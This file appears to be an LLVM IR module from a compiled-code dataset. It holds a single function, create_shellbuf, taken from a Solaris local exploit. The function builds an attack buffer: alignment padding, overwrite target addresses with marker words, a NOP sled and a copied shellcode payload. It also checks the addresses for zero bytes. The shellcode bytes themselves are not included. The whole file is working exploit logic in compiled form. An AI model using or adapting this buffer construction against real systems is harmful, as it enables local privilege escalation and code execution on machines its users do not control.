; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_197.c_create_shellbuf.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_197.c_create_shellbuf.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [50 x i8] c"Error: align is %d, it should be between 0 and 3\0A\00", align 1
@.str.1 = private unnamed_addr constant [62 x i8] c"Error: retloc (0x%x) or retloc+2 (0x%x) contains a zero byte\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@SHELL = common dso_local global i64 0, align 8
@NOP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [99 x i8] c"Error: The shell buffer is %d bytes long. It should be %d bytes. Something went terribly wrong...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @create_shellbuf(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %9 = load i32, i32* %5, align 4
  %10 = icmp slt i32 %9, 0
  br i1 %10, label %14, label %11

11:                                               ; preds = %3
  %12 = load i32, i32* %5, align 4
  %13 = icmp sgt i32 %12, 3
  br i1 %13, label %14, label %18

14:                                               ; preds = %11, %3
  %15 = load i32, i32* %5, align 4
  %16 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str, i64 0, i64 0), i32 %15)
  %17 = call i32 @exit(i32 1) #3
  unreachable

18:                                               ; preds = %11
  %19 = load i32, i32* %6, align 4
  %20 = call i64 @contains_zero(i32 %19)
  %21 = icmp ne i64 %20, 0
  br i1 %21, label %27, label %22

22:                                               ; preds = %18
  %23 = load i32, i32* %6, align 4
  %24 = add nsw i32 %23, 2
  %25 = call i64 @contains_zero(i32 %24)
  %26 = icmp ne i64 %25, 0
  br i1 %26, label %27, label %33

27:                                               ; preds = %22, %18
  %28 = load i32, i32* %6, align 4
  %29 = load i32, i32* %6, align 4
  %30 = add nsw i32 %29, 2
  %31 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.1, i64 0, i64 0), i32 %28, i32 %30)
  %32 = call i32 @exit(i32 1) #3
  unreachable

33:                                               ; preds = %22
  %34 = load i8*, i8** %4, align 8
  store i8* %34, i8** %7, align 8
  store i32 0, i32* %8, align 4
  br label %35

35:                                               ; preds = %42, %33
  %36 = load i32, i32* %8, align 4
  %37 = load i32, i32* %5, align 4
  %38 = icmp slt i32 %36, %37
  br i1 %38, label %39, label %45

39:                                               ; preds = %35
  %40 = load i8*, i8** %7, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %7, align 8
  store i8 65, i8* %40, align 1
  br label %42

42:                                               ; preds = %39
  %43 = load i32, i32* %8, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %8, align 4
  br label %35

45:                                               ; preds = %35
  %46 = load i8*, i8** %7, align 8
  %47 = call i8* @put_long(i8* %46, i32 1111638594)
  store i8* %47, i8** %7, align 8
  %48 = load i8*, i8** %7, align 8
  %49 = load i32, i32* %6, align 4
  %50 = call i8* @put_long(i8* %48, i32 %49)
  store i8* %50, i8** %7, align 8
  %51 = load i8*, i8** %7, align 8
  %52 = call i8* @put_long(i8* %51, i32 1111638594)
  store i8* %52, i8** %7, align 8
  %53 = load i8*, i8** %7, align 8
  %54 = load i32, i32* %6, align 4
  %55 = add nsw i32 %54, 2
  %56 = call i8* @put_long(i8* %53, i32 %55)
  store i8* %56, i8** %7, align 8
  br label %57

57:                                               ; preds = %71, %45
  %58 = load i8*, i8** %7, align 8
  %59 = ptrtoint i8* %58 to i64
  %60 = add nsw i64 %59, 4
  %61 = load i8*, i8** @shellcode, align 8
  %62 = call i32 @strlen(i8* %61)
  %63 = sext i32 %62 to i64
  %64 = add nsw i64 %60, %63
  %65 = add nsw i64 %64, 1
  %66 = load i8*, i8** %4, align 8
  %67 = ptrtoint i8* %66 to i64
  %68 = load i64, i64* @SHELL, align 8
  %69 = add nsw i64 %67, %68
  %70 = icmp slt i64 %65, %69
  br i1 %70, label %71, label %75

71:                                               ; preds = %57
  %72 = load i8*, i8** %7, align 8
  %73 = load i32, i32* @NOP, align 4
  %74 = call i8* @put_long(i8* %72, i32 %73)
  store i8* %74, i8** %7, align 8
  br label %57

75:                                               ; preds = %57
  %76 = load i8*, i8** %7, align 8
  %77 = load i8*, i8** @shellcode, align 8
  %78 = load i8*, i8** @shellcode, align 8
  %79 = call i32 @strlen(i8* %78)
  %80 = call i32 @memcpy(i8* %76, i8* %77, i32 %79)
  %81 = load i8*, i8** %7, align 8
  %82 = load i8*, i8** @shellcode, align 8
  %83 = call i32 @strlen(i8* %82)
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  store i8* %85, i8** %7, align 8
  br label %86

86:                                               ; preds = %95, %75
  %87 = load i8*, i8** %7, align 8
  %88 = ptrtoint i8* %87 to i64
  %89 = load i8*, i8** %4, align 8
  %90 = ptrtoint i8* %89 to i64
  %91 = load i64, i64* @SHELL, align 8
  %92 = add nsw i64 %90, %91
  %93 = sub nsw i64 %92, 1
  %94 = icmp slt i64 %88, %93
  br i1 %94, label %95, label %98

95:                                               ; preds = %86
  %96 = load i8*, i8** %7, align 8
  %97 = getelementptr inbounds i8, i8* %96, i32 1
  store i8* %97, i8** %7, align 8
  store i8 65, i8* %96, align 1
  br label %86

98:                                               ; preds = %86
  %99 = load i8*, i8** %7, align 8
  store i8 0, i8* %99, align 1
  %100 = load i8*, i8** %4, align 8
  %101 = call i32 @strlen(i8* %100)
  %102 = add nsw i32 %101, 1
  %103 = sext i32 %102 to i64
  %104 = load i64, i64* @SHELL, align 8
  %105 = icmp ne i64 %103, %104
  br i1 %105, label %106, label %113

106:                                              ; preds = %98
  %107 = load i8*, i8** %4, align 8
  %108 = call i32 @strlen(i8* %107)
  %109 = add nsw i32 %108, 1
  %110 = load i64, i64* @SHELL, align 8
  %111 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.2, i64 0, i64 0), i32 %109, i64 %110)
  %112 = call i32 @exit(i32 1) #3
  unreachable

113:                                              ; preds = %98
  ret void
}

declare dso_local i32 @printf(i8*, i32, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @contains_zero(i32) #1

declare dso_local i8* @put_long(i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
